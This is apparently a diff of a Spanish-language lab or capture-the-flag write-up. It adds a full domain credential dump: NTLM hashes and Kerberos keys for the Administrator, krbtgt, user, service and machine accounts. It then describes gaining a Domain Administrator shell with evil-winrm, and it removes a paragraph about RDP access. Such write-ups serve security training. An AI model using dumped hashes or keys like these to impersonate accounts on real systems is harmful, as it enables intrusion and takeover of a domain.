+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::
+Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::
+Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::
+Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::
+Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::
+Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::
+Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::
+Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::
+op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::
+op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::
+svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::
+svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::
+MS01$:1108:aad3b435b51404eeaad3b435b51404ee:fb3b628ebb845864ac71e7839f465987:::
+svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:34e8dda92bbbf6b5a4c4605e4931fa25:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:223c1b3a34e024798181df5812ff08617c8a874473002ca892f5f3312a0367d2
+Administrator:aes128-cts-hmac-sha1-96:98610a32239f909d2dd7191a0b200af3
+Administrator:des-cbc-md5:89e007fbc8197319
+krbtgt:aes256-cts-hmac-sha1-96:1f8d633a6aca948f3cfe1ae103ef2245825dc2f16ed171823ac817c097aea0f1
+krbtgt:aes128-cts-hmac-sha1-96:d746342824512200d29d504b040e150b
+krbtgt:des-cbc-md5:4923193b1c981332
+Sharon.Mullard:aes256-cts-hmac-sha1-96:46f1b3a696d5ce7194654e1ee205e05e5fc40fc6726232494d50172697404f59
+Sharon.Mullard:aes128-cts-hmac-sha1-96:ce1d4f67122df39096a0304087a37af9
+Sharon.Mullard:des-cbc-md5:1a7f4054163d7580
+Brandon.Keywarp:aes256-cts-hmac-sha1-96:5b6d15db9b7d5a87e6fab031a46dc560df979523edf72109a33dbee4c9023e2a
+Brandon.Keywarp:aes128-cts-hmac-sha1-96:c94f80b1f0f52971bc210cb7fa08e548
+Brandon.Keywarp:des-cbc-md5:80757608c7fef2ec
+Florence.Brown:aes256-cts-hmac-sha1-96:30edaa3ce504213f32a4ea4b4ee209788bc022d2702f45e512b8d552b530d9f3
+Florence.Brown:aes128-cts-hmac-sha1-96:68085dd2a95d4ead421af52312472061
+Florence.Brown:des-cbc-md5:ce7508bc0e7998ab
+Jonathan.Clinton:aes256-cts-hmac-sha1-96:ac2f7bfaee93c245ebbd9959fa420c32b1d69780560c8a23c605eb47e5d6cc46
+Jonathan.Clinton:aes128-cts-hmac-sha1-96:467238a4a231a28930e412d27ed8b09a
+Jonathan.Clinton:des-cbc-md5:087c674fcdf1bf8f
+Markus.Roheb:aes256-cts-hmac-sha1-96:48553e83896443f93aa77b0f280407f02d0a13da45c2c39598fb0fa298c17043
+Markus.Roheb:aes128-cts-hmac-sha1-96:e48c992fe7678056ac85e0fe169c02c5
+Markus.Roheb:des-cbc-md5:7940c4c8259b1af7
+Shivangi.Sumpta:aes256-cts-hmac-sha1-96:4b6f0e6c634bdc4dad3b91b42fec80135c5520f49aa7f7d541d27aacfce21d89
+Shivangi.Sumpta:aes128-cts-hmac-sha1-96:25fba62098625aecfe9f335aa71a01cb
+Shivangi.Sumpta:des-cbc-md5:c24fa21ccb91aba1
+Harry.Beaucorn:aes256-cts-hmac-sha1-96:f85edbb56f68155fb8b45360ba2e67cbe67893c8875d7ae1ea2a54085f082a73
+Harry.Beaucorn:aes128-cts-hmac-sha1-96:e21bf6bd700e77fdea81121431629f4c
+Harry.Beaucorn:des-cbc-md5:ab7c137ad364e66e
+op_Sharon.Mullard:aes256-cts-hmac-sha1-96:14457283d779320d1bf9e003ee084c9f70d8fec7324345ac15d16241c512299f
+op_Sharon.Mullard:aes128-cts-hmac-sha1-96:c439ce69fb34c7b2c693cd11dabd2488
+op_Sharon.Mullard:des-cbc-md5:8cc158f8527585ba
+op_Markus.Roheb:aes256-cts-hmac-sha1-96:630b8034289cce271b529607039bff05635578b555f055e15398e90665a3a91b
+op_Markus.Roheb:aes128-cts-hmac-sha1-96:48f2924abb1cdbe2b029a679b9f95e2c
+op_Markus.Roheb:des-cbc-md5:3876f7baa1e97932
+svc_smb:aes256-cts-hmac-sha1-96:ab6fd9c7fb1497cd70e54fbe3e763cfac26fa660ceee14492736c6c183b74e37
+svc_smb:aes128-cts-hmac-sha1-96:a8626be32fc03eff20e28b11101cd262
+svc_smb:des-cbc-md5:b0f8bfb5e6ea0431
+svc_cabackup:aes256-cts-hmac-sha1-96:7bb6d62ae4d9438ed967ac87ebe16c00ed8eec1d2ef6979288ad16a0ef9d1dd4
+svc_cabackup:aes128-cts-hmac-sha1-96:f85ae26f1f4f33686293221872fef92a
+svc_cabackup:des-cbc-md5:4a7504e5341910df
+DC01$:aes256-cts-hmac-sha1-96:a47600b1ff206958b49938fdff101d4444253de01f595c7fe1a5276e4265c245
+DC01$:aes128-cts-hmac-sha1-96:7043bf9b8bf4e5886058da7defab4581
+DC01$:des-cbc-md5:07fef70d97161502
+MS01$:aes256-cts-hmac-sha1-96:8f82e90633f5cd95da4d50f1c8c573a13377bffb3d1b0f85c810b71fab829553
+MS01$:aes128-cts-hmac-sha1-96:429030f2cb71f91150547d8b8717cedc
+MS01$:des-cbc-md5:76a40b38ce6e9776
+svc_ca$:aes256-cts-hmac-sha1-96:e811f438d10d4d18fd710f7712cde1e72d62c77e1d8e14d66251da48730454a5
+svc_ca$:aes128-cts-hmac-sha1-96:e9cbb36659c97cfdd00aae26d669fc5d
+svc_ca$:des-cbc-md5:b3439497cef2f82c
+[*] Cleaning up...
+```
+
 Finalmente, utilizando evil-winrm, se estableció una sesión interactiva como Domain Administrator, lo
 que permitió acceder al controlador de dominio y recuperar la flag root.txt, completando así el compromiso
 integral del entorno.
 
-Curiosidad técnica
-
-Como observación adicional, una vez completado el compromiso del entorno y obtenidos privilegios de
-administrador de dominio, fue posible establecer una conexión RDP directa hacia el sistema comprometido.
-Aunque no formaba parte del flujo principal de explotación, este acceso remoto permitió interactuar con el
-host de manera gráfica, sin necesidad de recurrir exclusivamente a sesiones de PowerShell o WinRM.
-
-24 de febrero de 2025
-
-27
-
-El acceso por RDP no aportó ventajas operativas significativas respecto a las técnicas ya empleadas, pero
-sí  ofreció  una  perspectiva  interesante  del  sistema  desde  el  punto  de  vista  del  usuario  final,  permitiendo
-validar visualmente el estado del entorno y confirmar la extensión del compromiso. Este tipo de acceso
-suele resultar útil en escenarios reales para realizar comprobaciones rápidas, revisar configuraciones locales
-o verificar el impacto de determinadas acciones sin depender únicamente de la línea de comando
-
-24 de febrero de 2025
-
-28
-
+<img src="assets/64.png">
 
